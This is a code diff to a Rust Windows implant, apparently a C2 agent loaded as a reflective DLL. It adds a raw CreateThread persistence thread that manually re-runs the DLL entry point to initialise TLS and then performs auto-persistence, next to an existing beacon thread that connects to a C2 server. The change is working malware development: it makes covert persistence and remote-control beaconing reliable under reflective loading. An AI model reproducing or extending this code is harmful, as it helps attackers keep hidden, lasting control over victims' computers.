@@ -98,6 +98,29 @@ mod dll_entry {
         ) -> HANDLE;
     }
 
+    /// Persistence background thread — spawned via raw CreateThread so TLS is
+    /// properly initialised (same approach as agent_thread). Using
+    /// std::thread::spawn() from within a reflectively-loaded DLL crashes
+    /// because DLL_THREAD_ATTACH is never delivered, leaving MSVC CRT TLS
+    /// uninitialised in the new thread.
+    extern "system" fn persist_thread(_param: LPVOID) -> DWORD {
+        let base = DLL_BASE.load(Ordering::Relaxed);
+        if !base.is_null() {
+            unsafe {
+                let dos = base as *const u8;
+                let e_lfanew = std::ptr::read_unaligned(dos.add(60) as *const u32) as usize;
+                let ep_rva = std::ptr::read_unaligned(
+                    dos.add(e_lfanew + 24 + 16) as *const u32,
+                ) as usize;
+                let entry: extern "system" fn(*mut c_void, u32, *mut c_void) -> i32 =
+                    std::mem::transmute(dos.add(ep_rva));
+                entry(base, DLL_THREAD_ATTACH, std::ptr::null_mut());
+            }
+        }
+        persistence::do_auto_persistence_work();
+        0
+    }
+
     extern "system" fn agent_thread(_param: LPVOID) -> DWORD {
         // ----------------------------------------------------------------
         // TLS initialisation for this raw OS thread.
@@ -145,13 +168,24 @@ mod dll_entry {
         _lp_reserved: LPVOID,
     ) -> i32 {
         if dw_reason == DLL_PROCESS_ATTACH {
-            // Save the DLL base so agent_thread can re-init TLS.
+            // Save the DLL base so agent_thread / persist_thread can re-init TLS.
             DLL_BASE.store(h_instance, Ordering::Relaxed);
             unsafe {
+                // Agent beacon thread (needs 4 MB for rustls)
                 CreateThread(
                     std::ptr::null_mut(),
-                    4 * 1024 * 1024,  // 4 MB stack — rustls needs room
+                    4 * 1024 * 1024,
                     agent_thread as LPVOID,
+                    std::ptr::null_mut(),
+                    0,
+                    std::ptr::null_mut(),
+                );
+                // Persistence thread — separate raw thread so TLS is properly
+                // initialised (std::thread::spawn is NOT safe in a reflective DLL).
+                CreateThread(
+                    std::ptr::null_mut(),
+                    1 * 1024 * 1024,  // 1 MB stack is enough
+                    persist_thread as LPVOID,
                     std::ptr::null_mut(),
                     0,
                     std::ptr::null_mut(),
@@ -182,9 +216,11 @@ fn run_agent() {
         }
     }
 
-    // Schedule auto-persistence
-    persistence::schedule_auto_persistence();
-    debug_print!("DEBUG: Auto-persistence scheduled");
+    // Auto-persistence is scheduled via a raw CreateThread in dll_entry::DllMain
+    // (DLL path) or via persistence::schedule_auto_persistence() in main.rs (EXE path).
+    // Do NOT call schedule_auto_persistence() here — std::thread::spawn() crashes
+    // in a reflectively-loaded DLL because DLL_THREAD_ATTACH is never delivered.
+    debug_print!("DEBUG: Auto-persistence handled by DllMain persist_thread");
 
     let c2_server = config::get_c2_server();
     debug_print!("DEBUG: Connecting (TLS) to {}", c2_server);
